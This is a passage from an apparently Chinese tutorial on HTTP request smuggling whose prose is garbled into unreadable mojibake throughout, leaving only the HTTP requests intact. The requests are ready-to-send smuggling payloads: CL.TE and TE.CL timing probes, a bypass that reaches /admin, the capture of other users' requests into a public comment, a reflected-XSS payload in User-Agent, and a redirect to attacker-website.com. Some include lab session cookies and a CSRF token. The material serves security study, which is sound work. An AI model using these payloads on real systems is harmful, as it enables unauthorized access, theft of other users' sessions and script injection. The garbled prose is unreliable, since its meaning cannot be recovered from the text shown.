<p>è¯†åˆ« HTTP è¯·æ±‚èµ°ç§æ¼æ´é€šå¸¸å¯ä»¥é€šè¿‡æ—¶é—´æŠ€æœ¯å®ç°ï¼Œè¿™ä¾èµ–äºè§‚å¯ŸæœåŠ¡å™¨å“åº”è¢«æ“çºµè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚è¿™äº›æŠ€æœ¯å¯¹äºæ£€æµ‹ CL.TE å’Œ TE.CL æ¼æ´ç‰¹åˆ«æœ‰ç”¨ã€‚é™¤äº†è¿™äº›æ–¹æ³•ï¼Œè¿˜æœ‰å…¶ä»–ç­–ç•¥å’Œå·¥å…·å¯ä»¥ç”¨æ¥æŸ¥æ‰¾æ­¤ç±»æ¼æ´ï¼š</p>
<h3 id="ä½¿ç”¨æ—¶é—´æŠ€æœ¯æŸ¥æ‰¾-clte-æ¼æ´"><a class="header" href="#ä½¿ç”¨æ—¶é—´æŠ€æœ¯æŸ¥æ‰¾-clte-æ¼æ´">ä½¿ç”¨æ—¶é—´æŠ€æœ¯æŸ¥æ‰¾ CL.TE æ¼æ´</a></h3>
<ul>
<li><strong>æ–¹æ³•ï¼š</strong></li>
<li>å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå¦‚æœåº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ï¼Œå°†å¯¼è‡´åç«¯æœåŠ¡å™¨ç­‰å¾…é¢å¤–æ•°æ®ã€‚</li>
<li><strong>ç¤ºä¾‹ï¼š</strong></li>
</ul>
<pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
</code></pre>
<ul>
<li><strong>è§‚å¯Ÿï¼š</strong></li>
<li>å‰ç«¯æœåŠ¡å™¨æ ¹æ® <code>Content-Length</code> å¤„ç†è¯·æ±‚ï¼Œå¹¶æå‰æˆªæ–­æ¶ˆæ¯ã€‚</li>
<li>åç«¯æœåŠ¡å™¨æœŸæœ›æ¥æ”¶åˆ†å—æ¶ˆæ¯ï¼Œç­‰å¾…ä¸‹ä¸€ä¸ªä»æœªåˆ°è¾¾çš„å—ï¼Œå¯¼è‡´å»¶è¿Ÿã€‚</li>
<li><strong>æŒ‡æ ‡ï¼š</strong></li>
<li>å“åº”è¶…æ—¶æˆ–é•¿æ—¶é—´å»¶è¿Ÿã€‚</li>
<li>ä»åç«¯æœåŠ¡å™¨æ”¶åˆ° 400 Bad Request é”™è¯¯ï¼Œæœ‰æ—¶é™„å¸¦è¯¦ç»†çš„æœåŠ¡å™¨ä¿¡æ¯ã€‚</li>
</ul>
<h3 id="ä½¿ç”¨æ—¶é—´æŠ€æœ¯æŸ¥æ‰¾-tecl-æ¼æ´"><a class="header" href="#ä½¿ç”¨æ—¶é—´æŠ€æœ¯æŸ¥æ‰¾-tecl-æ¼æ´">ä½¿ç”¨æ—¶é—´æŠ€æœ¯æŸ¥æ‰¾ TE.CL æ¼æ´</a></h3>
<ul>
<li><strong>æ–¹æ³•ï¼š</strong></li>
<li>å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå¦‚æœåº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ï¼Œå°†å¯¼è‡´åç«¯æœåŠ¡å™¨ç­‰å¾…é¢å¤–æ•°æ®ã€‚</li>
<li><strong>ç¤ºä¾‹ï¼š</strong></li>
</ul>
<pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
</code></pre>
<ul>
<li><strong>è§‚å¯Ÿï¼š</strong></li>
<li>å‰ç«¯æœåŠ¡å™¨æ ¹æ® <code>Transfer-Encoding</code> å¤„ç†è¯·æ±‚å¹¶è½¬å‘æ•´ä¸ªæ¶ˆæ¯ã€‚</li>
<li>åç«¯æœåŠ¡å™¨æœŸæœ›æ ¹æ® <code>Content-Length</code> æ¥æ”¶æ¶ˆæ¯ï¼Œç­‰å¾…ä»æœªåˆ°è¾¾çš„é¢å¤–æ•°æ®ï¼Œå¯¼è‡´å»¶è¿Ÿã€‚</li>
</ul>
<h3 id="æŸ¥æ‰¾æ¼æ´çš„å…¶ä»–æ–¹æ³•"><a class="header" href="#æŸ¥æ‰¾æ¼æ´çš„å…¶ä»–æ–¹æ³•">æŸ¥æ‰¾æ¼æ´çš„å…¶ä»–æ–¹æ³•</a></h3>
<ul>
<li><strong>å·®å¼‚å“åº”åˆ†æï¼š</strong></li>
<li>å‘é€ç•¥æœ‰ä¸åŒç‰ˆæœ¬çš„è¯·æ±‚ï¼Œè§‚å¯ŸæœåŠ¡å™¨å“åº”æ˜¯å¦ä»¥æ„å¤–æ–¹å¼ä¸åŒï¼ŒæŒ‡ç¤ºè§£æå·®å¼‚ã€‚</li>
<li><strong>ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·ï¼š</strong></li>
<li>åƒ Burp Suite çš„ 'HTTP Request Smuggler' æ‰©å±•å¯ä»¥é€šè¿‡å‘é€å„ç§æ¨¡ç³Šè¯·æ±‚å¹¶åˆ†æå“åº”ï¼Œè‡ªåŠ¨æµ‹è¯•è¿™äº›æ¼æ´ã€‚</li>
<li><strong>Content-Length å˜å¼‚æµ‹è¯•ï¼š</strong></li>
<li>å‘é€å…·æœ‰ä¸åŒ <code>Content-Length</code> å€¼çš„è¯·æ±‚ï¼Œè¿™äº›å€¼ä¸å®é™…å†…å®¹é•¿åº¦ä¸ä¸€è‡´ï¼Œå¹¶è§‚å¯ŸæœåŠ¡å™¨å¦‚ä½•å¤„ç†è¿™äº›ä¸åŒ¹é…ã€‚</li>
<li><strong>Transfer-Encoding å˜å¼‚æµ‹è¯•ï¼š</strong></li>
<li>å‘é€å…·æœ‰æ¨¡ç³Šæˆ–æ ¼å¼é”™è¯¯çš„ <code>Transfer-Encoding</code> å¤´çš„è¯·æ±‚ï¼Œå¹¶ç›‘æ§å‰ç«¯å’Œåç«¯æœåŠ¡å™¨å¦‚ä½•å¯¹è¿™äº›æ“æ§åšå‡ºä¸åŒå“åº”ã€‚</li>
</ul>
<h3 id="http-è¯·æ±‚èµ°ç§æ¼æ´æµ‹è¯•"><a class="header" href="#http-è¯·æ±‚èµ°ç§æ¼æ´æµ‹è¯•">HTTP è¯·æ±‚èµ°ç§æ¼æ´æµ‹è¯•</a></h3>
<p>åœ¨ç¡®è®¤æ—¶é—´æŠ€æœ¯çš„æœ‰æ•ˆæ€§åï¼ŒéªŒè¯å®¢æˆ·ç«¯è¯·æ±‚æ˜¯å¦å¯ä»¥è¢«æ“çºµè‡³å…³é‡è¦ã€‚ä¸€ä¸ªç®€å•çš„æ–¹æ³•æ˜¯å°è¯•æ¯’åŒ–ä½ çš„è¯·æ±‚ï¼Œä¾‹å¦‚ï¼Œä½¿å¯¹ <code>/</code> çš„è¯·æ±‚è¿”å› 404 å“åº”ã€‚ä¹‹å‰åœ¨ <a href="./#basic-examples">åŸºæœ¬ç¤ºä¾‹</a> ä¸­è®¨è®ºçš„ <code>CL.TE</code> å’Œ <code>TE.CL</code> ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•æ¯’åŒ–å®¢æˆ·ç«¯è¯·æ±‚ä»¥å¼•å‘ 404 å“åº”ï¼Œå°½ç®¡å®¢æˆ·ç«¯æ—¨åœ¨è®¿é—®ä¸åŒçš„èµ„æºã€‚</p>
<p><strong>å…³é”®è€ƒè™‘äº‹é¡¹</strong></p>
<p>åœ¨é€šè¿‡å¹²æ‰°å…¶ä»–è¯·æ±‚æµ‹è¯•è¯·æ±‚èµ°ç§æ¼æ´æ—¶ï¼Œè¯·è®°ä½ï¼š</p>
<ul>
<li><strong>ç‹¬ç«‹ç½‘ç»œè¿æ¥ï¼š</strong> â€œæ”»å‡»â€å’Œâ€œæ­£å¸¸â€è¯·æ±‚åº”é€šè¿‡ç‹¬ç«‹çš„ç½‘ç»œè¿æ¥å‘é€ã€‚å¯¹ä¸¤è€…ä½¿ç”¨ç›¸åŒè¿æ¥å¹¶ä¸èƒ½éªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚</li>
<li><strong>ä¸€è‡´çš„ URL å’Œå‚æ•°ï¼š</strong> åŠ›æ±‚å¯¹ä¸¤ä¸ªè¯·æ±‚ä½¿ç”¨ç›¸åŒçš„ URL å’Œå‚æ•°åç§°ã€‚ç°ä»£åº”ç”¨ç¨‹åºé€šå¸¸æ ¹æ® URL å’Œå‚æ•°å°†è¯·æ±‚è·¯ç”±åˆ°ç‰¹å®šçš„åç«¯æœåŠ¡å™¨ã€‚åŒ¹é…è¿™äº›å¯ä»¥å¢åŠ ä¸¤ä¸ªè¯·æ±‚ç”±åŒä¸€æœåŠ¡å™¨å¤„ç†çš„å¯èƒ½æ€§ï¼Œè¿™æ˜¯æˆåŠŸæ”»å‡»çš„å‰æã€‚</li>
<li><strong>æ—¶é—´å’Œç«äº‰æ¡ä»¶ï¼š</strong> â€œæ­£å¸¸â€è¯·æ±‚æ—¨åœ¨æ£€æµ‹â€œæ”»å‡»â€è¯·æ±‚çš„å¹²æ‰°ï¼Œä¸å…¶ä»–å¹¶å‘åº”ç”¨è¯·æ±‚ç«äº‰ã€‚å› æ­¤ï¼Œåœ¨â€œæ”»å‡»â€è¯·æ±‚åç«‹å³å‘é€â€œæ­£å¸¸â€è¯·æ±‚ã€‚ç¹å¿™çš„åº”ç”¨ç¨‹åºå¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•ä»¥ç¡®è®¤æ¼æ´ã€‚</li>
<li><strong>è´Ÿè½½å‡è¡¡æŒ‘æˆ˜ï¼š</strong> ä½œä¸ºè´Ÿè½½å‡è¡¡å™¨çš„å‰ç«¯æœåŠ¡å™¨å¯èƒ½ä¼šå°†è¯·æ±‚åˆ†é…åˆ°ä¸åŒçš„åç«¯ç³»ç»Ÿã€‚å¦‚æœâ€œæ”»å‡»â€å’Œâ€œæ­£å¸¸â€è¯·æ±‚æœ€ç»ˆè½åœ¨ä¸åŒçš„ç³»ç»Ÿä¸Šï¼Œæ”»å‡»å°†ä¸ä¼šæˆåŠŸã€‚è¿™ä¸ªè´Ÿè½½å‡è¡¡æ–¹é¢å¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•ä»¥ç¡®è®¤æ¼æ´ã€‚</li>
<li><strong>æ„å¤–ç”¨æˆ·å½±å“ï¼š</strong> å¦‚æœä½ çš„æ”»å‡»æ— æ„ä¸­å½±å“äº†å¦ä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚ï¼ˆä¸æ˜¯ä½ å‘é€çš„â€œæ­£å¸¸â€è¯·æ±‚ä»¥è¿›è¡Œæ£€æµ‹ï¼‰ï¼Œè¿™è¡¨æ˜ä½ çš„æ”»å‡»å½±å“äº†å¦ä¸€ä¸ªåº”ç”¨ç”¨æˆ·ã€‚æŒç»­æµ‹è¯•å¯èƒ½ä¼šå¹²æ‰°å…¶ä»–ç”¨æˆ·ï¼Œå› æ­¤éœ€è¦è°¨æ…å¤„ç†ã€‚</li>
</ul>
<h2 id="æ»¥ç”¨-http-è¯·æ±‚èµ°ç§"><a class="header" href="#æ»¥ç”¨-http-è¯·æ±‚èµ°ç§">æ»¥ç”¨ HTTP è¯·æ±‚èµ°ç§</a></h2>
<h3 id="é€šè¿‡-http-è¯·æ±‚èµ°ç§ç»•è¿‡å‰ç«¯å®‰å…¨"><a class="header" href="#é€šè¿‡-http-è¯·æ±‚èµ°ç§ç»•è¿‡å‰ç«¯å®‰å…¨">é€šè¿‡ HTTP è¯·æ±‚èµ°ç§ç»•è¿‡å‰ç«¯å®‰å…¨</a></h3>
<p>æœ‰æ—¶ï¼Œå‰ç«¯ä»£ç†ä¼šå®æ–½å®‰å…¨æªæ–½ï¼Œå®¡æŸ¥ä¼ å…¥è¯·æ±‚ã€‚ç„¶è€Œï¼Œè¿™äº›æªæ–½å¯ä»¥é€šè¿‡åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§æ¥è§„é¿ï¼Œä»è€Œå…è®¸æœªç»æˆæƒè®¿é—®å—é™ç«¯ç‚¹ã€‚ä¾‹å¦‚ï¼Œè®¿é—® <code>/admin</code> å¯èƒ½åœ¨å¤–éƒ¨è¢«ç¦æ­¢ï¼Œå‰ç«¯ä»£ç†ç§¯æé˜»æ­¢æ­¤ç±»å°è¯•ã€‚ç„¶è€Œï¼Œè¿™ä¸ªä»£ç†å¯èƒ½å¿½ç•¥äº†åœ¨èµ°ç§çš„ HTTP è¯·æ±‚ä¸­åµŒå…¥çš„è¯·æ±‚ï¼Œä»è€Œç•™ä¸‹äº†ç»•è¿‡è¿™äº›é™åˆ¶çš„æ¼æ´ã€‚</p>
<p>è€ƒè™‘ä»¥ä¸‹ç¤ºä¾‹ï¼Œè¯´æ˜å¦‚ä½•ä½¿ç”¨ HTTP è¯·æ±‚èµ°ç§ç»•è¿‡å‰ç«¯å®‰å…¨æ§åˆ¶ï¼Œç‰¹åˆ«æ˜¯é’ˆå¯¹é€šå¸¸ç”±å‰ç«¯ä»£ç†ä¿æŠ¤çš„ <code>/admin</code> è·¯å¾„ï¼š</p>
<p><strong>CL.TE ç¤ºä¾‹</strong></p>
<pre><code>POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
</code></pre>
<p>åœ¨CL.TEæ”»å‡»ä¸­ï¼Œåˆå§‹è¯·æ±‚åˆ©ç”¨äº†<code>Content-Length</code>å¤´ï¼Œè€Œåç»­åµŒå…¥è¯·æ±‚åˆ™ä½¿ç”¨<code>Transfer-Encoding: chunked</code>å¤´ã€‚å‰ç«¯ä»£ç†å¤„ç†åˆå§‹<code>POST</code>è¯·æ±‚ï¼Œä½†æœªèƒ½æ£€æŸ¥åµŒå…¥çš„<code>GET /admin</code>è¯·æ±‚ï¼Œä»è€Œå…è®¸å¯¹<code>/admin</code>è·¯å¾„çš„æœªç»æˆæƒè®¿é—®ã€‚</p>
<p><strong>TE.CL ç¤ºä¾‹</strong></p>
<pre><code>POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

</code></pre>
<p>ç›¸åï¼Œåœ¨TE.CLæ”»å‡»ä¸­ï¼Œåˆå§‹çš„<code>POST</code>è¯·æ±‚ä½¿ç”¨<code>Transfer-Encoding: chunked</code>ï¼Œè€Œåç»­çš„åµŒå…¥è¯·æ±‚åˆ™åŸºäº<code>Content-Length</code>å¤´è¿›è¡Œå¤„ç†ã€‚ä¸CL.TEæ”»å‡»ç±»ä¼¼ï¼Œå‰ç«¯ä»£ç†å¿½è§†äº†è¢«éšè—çš„<code>GET /admin</code>è¯·æ±‚ï¼Œæ„å¤–åœ°æˆäºˆäº†å¯¹å—é™<code>/admin</code>è·¯å¾„çš„è®¿é—®ã€‚</p>
<h3 id="æ˜¾ç¤ºå‰ç«¯è¯·æ±‚é‡å†™"><a class="header" href="#æ˜¾ç¤ºå‰ç«¯è¯·æ±‚é‡å†™">æ˜¾ç¤ºå‰ç«¯è¯·æ±‚é‡å†™ <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a></a></h3>
<p>åº”ç”¨ç¨‹åºé€šå¸¸ä½¿ç”¨<strong>å‰ç«¯æœåŠ¡å™¨</strong>æ¥ä¿®æ”¹ä¼ å…¥è¯·æ±‚ï¼Œç„¶åå°†å…¶ä¼ é€’ç»™åç«¯æœåŠ¡å™¨ã€‚å…¸å‹çš„ä¿®æ”¹æ¶‰åŠæ·»åŠ å¤´ä¿¡æ¯ï¼Œä¾‹å¦‚<code>X-Forwarded-For: &lt;IP of the client&gt;</code>ï¼Œä»¥å°†å®¢æˆ·ç«¯çš„IPè½¬å‘ç»™åç«¯ã€‚ç†è§£è¿™äº›ä¿®æ”¹å¯èƒ½è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒå¯èƒ½æ­ç¤º<strong>ç»•è¿‡ä¿æŠ¤</strong>æˆ–<strong>å‘ç°éšè—çš„ä¿¡æ¯æˆ–ç«¯ç‚¹</strong>çš„æ–¹æ³•ã€‚</p>
<p>è¦è°ƒæŸ¥ä»£ç†å¦‚ä½•æ›´æ”¹è¯·æ±‚ï¼Œæ‰¾åˆ°ä¸€ä¸ªåç«¯åœ¨å“åº”ä¸­å›æ˜¾çš„POSTå‚æ•°ã€‚ç„¶åï¼Œæ„é€ ä¸€ä¸ªè¯·æ±‚ï¼Œä½¿ç”¨è¿™ä¸ªå‚æ•°ä½œä¸ºæœ€åä¸€ä¸ªï¼Œç±»ä¼¼äºä»¥ä¸‹å†…å®¹ï¼š</p>
<pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
</code></pre>
<p>åœ¨è¿™ä¸ªç»“æ„ä¸­ï¼Œåç»­è¯·æ±‚ç»„ä»¶è¢«é™„åŠ åœ¨ <code>search=</code> ä¹‹åï¼Œè¿™æ˜¯åœ¨å“åº”ä¸­åæ˜ çš„å‚æ•°ã€‚è¿™ä¸ªåæ˜ å°†æš´éœ²åç»­è¯·æ±‚çš„å¤´éƒ¨ã€‚</p>
<p>é‡è¦çš„æ˜¯è¦å°†åµŒå¥—è¯·æ±‚çš„ <code>Content-Length</code> å¤´ä¸å®é™…å†…å®¹é•¿åº¦å¯¹é½ã€‚å»ºè®®ä»ä¸€ä¸ªå°å€¼å¼€å§‹ï¼Œå¹¶é€æ¸å¢åŠ ï¼Œå› ä¸ºè¿‡ä½çš„å€¼ä¼šæˆªæ–­åæ˜ çš„æ•°æ®ï¼Œè€Œè¿‡é«˜çš„å€¼å¯èƒ½ä¼šå¯¼è‡´è¯·æ±‚å‡ºé”™ã€‚</p>
<p>è¯¥æŠ€æœ¯åœ¨ TE.CL æ¼æ´çš„ä¸Šä¸‹æ–‡ä¸­ä¹Ÿé€‚ç”¨ï¼Œä½†è¯·æ±‚åº”ä»¥ <code>search=\r\n0</code> ç»“æŸã€‚æ— è®ºæ¢è¡Œç¬¦å¦‚ä½•ï¼Œå€¼å°†é™„åŠ åˆ°æœç´¢å‚æ•°ä¸­ã€‚</p>
<p>æ­¤æ–¹æ³•ä¸»è¦ç”¨äºç†è§£å‰ç«¯ä»£ç†æ‰€åšçš„è¯·æ±‚ä¿®æ”¹ï¼ŒåŸºæœ¬ä¸Šè¿›è¡Œè‡ªæˆ‘å¯¼å‘çš„è°ƒæŸ¥ã€‚</p>
<h3 id="æ•è·å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚"><a class="header" href="#æ•è·å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚">æ•è·å…¶ä»–ç”¨æˆ·çš„è¯·æ±‚ <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a></a></h3>
<p>é€šè¿‡åœ¨ POST æ“ä½œæœŸé—´å°†ç‰¹å®šè¯·æ±‚é™„åŠ ä¸ºå‚æ•°çš„å€¼ï¼Œå¯ä»¥æ•è·ä¸‹ä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚ã€‚ä»¥ä¸‹æ˜¯å¦‚ä½•å®ç°è¿™ä¸€ç‚¹çš„ï¼š</p>
<p>é€šè¿‡å°†ä»¥ä¸‹è¯·æ±‚é™„åŠ ä¸ºå‚æ•°çš„å€¼ï¼Œæ‚¨å¯ä»¥å­˜å‚¨åç»­å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼š</p>
<pre><code>POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&amp;postId=4&amp;name=asdfghjklo&amp;email=email%40email.com&amp;comment=
</code></pre>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ<strong>comment å‚æ•°</strong>æ—¨åœ¨å­˜å‚¨åœ¨å…¬å¼€å¯è®¿é—®é¡µé¢çš„å¸–å­è¯„è®ºéƒ¨åˆ†ä¸­çš„å†…å®¹ã€‚å› æ­¤ï¼Œåç»­è¯·æ±‚çš„å†…å®¹å°†ä½œä¸ºè¯„è®ºå‡ºç°ã€‚</p>
<p>ç„¶è€Œï¼Œè¿™ç§æŠ€æœ¯æœ‰å…¶å±€é™æ€§ã€‚é€šå¸¸ï¼Œå®ƒä»…æ•è·ç›´åˆ°åœ¨èµ°ç§è¯·æ±‚ä¸­ä½¿ç”¨çš„å‚æ•°åˆ†éš”ç¬¦çš„æ•°æ®ã€‚å¯¹äº URL ç¼–ç çš„è¡¨å•æäº¤ï¼Œè¿™ä¸ªåˆ†éš”ç¬¦æ˜¯ <code>&amp;</code> å­—ç¬¦ã€‚è¿™æ„å‘³ç€ä»å—å®³ç”¨æˆ·è¯·æ±‚ä¸­æ•è·çš„å†…å®¹å°†åœ¨ç¬¬ä¸€ä¸ª <code>&amp;</code> å¤„åœæ­¢ï¼Œè¿™å¯èƒ½ç”šè‡³æ˜¯æŸ¥è¯¢å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚</p>
<p>æ­¤å¤–ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§æ–¹æ³•åœ¨ TE.CL æ¼æ´ä¸­ä¹Ÿæ˜¯å¯è¡Œçš„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯·æ±‚åº”ä»¥ <code>search=\r\n0</code> ç»“æŸã€‚æ— è®ºæ¢è¡Œç¬¦å¦‚ä½•ï¼Œå€¼å°†é™„åŠ åˆ°æœç´¢å‚æ•°ä¸­ã€‚</p>
<h3 id="ä½¿ç”¨-http-è¯·æ±‚èµ°ç§æ¥åˆ©ç”¨åå°„å‹-xss"><a class="header" href="#ä½¿ç”¨-http-è¯·æ±‚èµ°ç§æ¥åˆ©ç”¨åå°„å‹-xss">ä½¿ç”¨ HTTP è¯·æ±‚èµ°ç§æ¥åˆ©ç”¨åå°„å‹ XSS</a></h3>
<p>HTTP è¯·æ±‚èµ°ç§å¯ä»¥è¢«ç”¨æ¥åˆ©ç”¨æ˜“å— <strong>åå°„å‹ XSS</strong> æ”»å‡»çš„ç½‘é¡µï¼Œæä¾›æ˜¾è‘—çš„ä¼˜åŠ¿ï¼š</p>
<ul>
<li><strong>ä¸éœ€è¦</strong>ä¸ç›®æ ‡ç”¨æˆ·äº’åŠ¨ã€‚</li>
<li>å…è®¸åœ¨è¯·æ±‚çš„ <strong>é€šå¸¸æ— æ³•è¾¾åˆ°</strong> çš„éƒ¨åˆ†åˆ©ç”¨ XSSï¼Œä¾‹å¦‚ HTTP è¯·æ±‚å¤´ã€‚</li>
</ul>
<p>åœ¨ç½‘ç«™é€šè¿‡ User-Agent å¤´éƒ¨æ˜“å—åå°„å‹ XSS æ”»å‡»çš„æƒ…å†µä¸‹ï¼Œä»¥ä¸‹æœ‰æ•ˆè½½è·æ¼”ç¤ºäº†å¦‚ä½•åˆ©ç”¨æ­¤æ¼æ´ï¼š</p>
<pre><code>POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "&gt;&lt;script&gt;alert(1)&lt;/script&gt;
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
</code></pre>
<p>è¿™ä¸ªæœ‰æ•ˆè½½è·çš„ç»“æ„æ—¨åœ¨åˆ©ç”¨æ¼æ´ï¼Œé€šè¿‡ä»¥ä¸‹æ–¹å¼ï¼š</p>
<ol>
<li>å‘èµ·ä¸€ä¸ªçœ‹ä¼¼å…¸å‹çš„ <code>POST</code> è¯·æ±‚ï¼Œå¸¦æœ‰ <code>Transfer-Encoding: chunked</code> å¤´éƒ¨ä»¥æŒ‡ç¤ºå¼€å§‹è¿›è¡Œèµ°ç§ã€‚</li>
<li>éšåè·Ÿéšä¸€ä¸ª <code>0</code>ï¼Œæ ‡è®°å—æ¶ˆæ¯ä½“çš„ç»“æŸã€‚</li>
<li>ç„¶åï¼Œå¼•å…¥ä¸€ä¸ªèµ°ç§çš„ <code>GET</code> è¯·æ±‚ï¼Œå…¶ä¸­ <code>User-Agent</code> å¤´éƒ¨æ³¨å…¥äº†ä¸€ä¸ªè„šæœ¬ï¼Œ<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>ï¼Œå½“æœåŠ¡å™¨å¤„ç†è¿™ä¸ªåç»­è¯·æ±‚æ—¶è§¦å‘ XSSã€‚</li>
</ol>
<p>é€šè¿‡èµ°ç§æ“æ§ <code>User-Agent</code>ï¼Œè¯¥æœ‰æ•ˆè½½è·ç»•è¿‡äº†æ­£å¸¸è¯·æ±‚çº¦æŸï¼Œä»è€Œä»¥éæ ‡å‡†ä½†æœ‰æ•ˆçš„æ–¹å¼åˆ©ç”¨äº†åå°„å‹ XSS æ¼æ´ã€‚</p>
<h4 id="http09"><a class="header" href="#http09">HTTP/0.9</a></h4>
<p>{% hint style="danger" %}
å¦‚æœç”¨æˆ·å†…å®¹åœ¨å“åº”ä¸­ä»¥ <strong><code>Content-type</code></strong> åå°„ï¼Œä¾‹å¦‚ <strong><code>text/plain</code></strong>ï¼Œå°†é˜»æ­¢ XSS çš„æ‰§è¡Œã€‚å¦‚æœæœåŠ¡å™¨æ”¯æŒ <strong>HTTP/0.9ï¼Œå¯èƒ½å¯ä»¥ç»•è¿‡è¿™ä¸€ç‚¹</strong>ï¼
{% endhint %}</p>
<p>ç‰ˆæœ¬ HTTP/0.9 æ—©äº 1.0ï¼Œä»…ä½¿ç”¨ <strong>GET</strong> åŠ¨è¯ï¼Œå¹¶ä¸” <strong>ä¸</strong> å“åº” <strong>å¤´éƒ¨</strong>ï¼Œåªæœ‰ä¸»ä½“ã€‚</p>
<p>åœ¨ <a href="https://mizu.re/post/twisty-python"><strong>è¿™ç¯‡æ–‡ç« </strong></a> ä¸­ï¼Œåˆ©ç”¨äº†è¯·æ±‚èµ°ç§å’Œä¸€ä¸ª <strong>ä¼šå›å¤ç”¨æˆ·è¾“å…¥çš„æ˜“å—æ”»å‡»ç«¯ç‚¹</strong> æ¥èµ°ç§ä¸€ä¸ª HTTP/0.9 è¯·æ±‚ã€‚å“åº”ä¸­åå°„çš„å‚æ•°åŒ…å«ä¸€ä¸ª <strong>ä¼ªé€ çš„ HTTP/1.1 å“åº”ï¼ˆå¸¦æœ‰å¤´éƒ¨å’Œä¸»ä½“ï¼‰</strong>ï¼Œå› æ­¤å“åº”å°†åŒ…å«æœ‰æ•ˆçš„å¯æ‰§è¡Œ JS ä»£ç ï¼Œ<code>Content-Type</code> ä¸º <code>text/html</code>ã€‚</p>
<h3 id="åˆ©ç”¨-http-è¯·æ±‚èµ°ç§è¿›è¡Œç«™å†…é‡å®šå‘"><a class="header" href="#åˆ©ç”¨-http-è¯·æ±‚èµ°ç§è¿›è¡Œç«™å†…é‡å®šå‘">åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§è¿›è¡Œç«™å†…é‡å®šå‘ <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a></a></h3>
<p>åº”ç”¨ç¨‹åºé€šå¸¸é€šè¿‡ä½¿ç”¨é‡å®šå‘ URL ä¸­çš„ <code>Host</code> å¤´éƒ¨çš„ä¸»æœºåä»ä¸€ä¸ª URL é‡å®šå‘åˆ°å¦ä¸€ä¸ª URLã€‚è¿™åœ¨åƒ Apache å’Œ IIS è¿™æ ·çš„ Web æœåŠ¡å™¨ä¸­å¾ˆå¸¸è§ã€‚ä¾‹å¦‚ï¼Œè¯·æ±‚ä¸€ä¸ªæ²¡æœ‰å°¾éƒ¨æ–œæ çš„æ–‡ä»¶å¤¹ä¼šå¯¼è‡´é‡å®šå‘ä»¥åŒ…å«æ–œæ ï¼š</p>
<pre><code>GET /home HTTP/1.1
Host: normal-website.com
</code></pre>
<p>ç»“æœä¸ºï¼š</p>
<pre><code>HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
</code></pre>
<p>å°½ç®¡çœ‹ä¼¼æ— å®³ï¼Œä½†è¿™ç§è¡Œä¸ºå¯ä»¥é€šè¿‡HTTPè¯·æ±‚èµ°ç§è¿›è¡Œæ“æ§ï¼Œä»¥å°†ç”¨æˆ·é‡å®šå‘åˆ°å¤–éƒ¨ç½‘ç«™ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code>POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
</code></pre>
